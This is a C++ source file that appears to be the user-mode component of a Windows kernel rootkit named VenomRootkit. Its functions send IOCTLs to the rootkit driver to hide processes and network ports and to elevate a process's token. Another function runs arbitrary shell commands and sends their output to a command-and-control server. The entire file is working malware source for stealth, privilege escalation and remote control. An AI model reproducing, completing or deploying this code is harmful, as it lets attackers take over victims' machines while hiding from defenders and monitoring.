#include "VenomCommands.h"
#include "../VenomRootkit/Ioctl.h"
#include <array>


bool VenomCommands::hideProcess(ULONG pid)
{
	auto hDevice = CreateFile(L"\\\\.\\VenomRootkit", GENERIC_WRITE,
		FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);

	DWORD returned = 0;
	BOOL success = DeviceIoControl(hDevice, (DWORD)VenomIoctls::HideProcces, &pid, sizeof(pid), nullptr, 0, &returned, nullptr);

	CloseHandle(hDevice);

	return success;
}

bool VenomCommands::hidePort(USHORT port)
{
	auto hDevice = CreateFile(L"\\\\.\\VenomRootkit", GENERIC_WRITE,
		FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);

	DWORD returned = 0;
	BOOL success = DeviceIoControl(hDevice, (DWORD)VenomIoctls::HidePort, &port, sizeof(port), nullptr, 0, &returned, nullptr);

	CloseHandle(hDevice);

	return success;
}

bool VenomCommands::elevateToken(ULONG pid)
{
	auto hDevice = CreateFile(L"\\\\.\\VenomRootkit", GENERIC_WRITE,
		FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);

	DWORD returned = 0;
	BOOL success = DeviceIoControl(hDevice, (DWORD)VenomIoctls::Elevate, &pid, sizeof(pid), nullptr, 0, &returned, nullptr);

	CloseHandle(hDevice);

	return success;
}

bool VenomCommands::executeCommand(const char* command, CommunicationHandler::Communicator cncCommunicator)
{
	std::array<char,  commandOutputBufferLength> buffer;
	std::string result;
	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(command, "r"), _pclose);

	if (!pipe)
	{
		cncCommunicator.sendDataToCnc("Error while opening pipe.");
		return 0;
	}

	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
	{
		result += buffer.data();
	}

	cncCommunicator.sendDataToCnc(result.c_str());

	return 1;
}